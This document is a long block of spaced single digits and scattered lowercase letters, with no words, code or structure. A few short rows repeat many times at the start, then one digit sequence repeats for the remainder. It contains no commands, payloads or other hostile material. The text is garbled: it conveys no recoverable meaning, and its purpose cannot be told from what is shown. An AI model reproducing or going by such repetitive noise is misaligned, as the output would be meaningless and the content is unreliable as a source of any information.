1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  8
0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
  1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
    1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
 1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
 1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
  1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
  1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
  1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
  1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
  1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
  1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
  1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
  1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
  1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
  1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
  1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9    5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0     2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
  1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
  1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
  1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
  1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
 1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
  1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
  1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5     0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
  1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
  1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
  1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
  1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
  1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
  1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
  1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2    8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
  1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
  1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
  1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
  1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
    1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
  1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
    1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
  1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
  1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
 1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
  1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
     1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
  1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
  1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
  1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
  1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
     1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
  1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
 1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
  1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
  1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
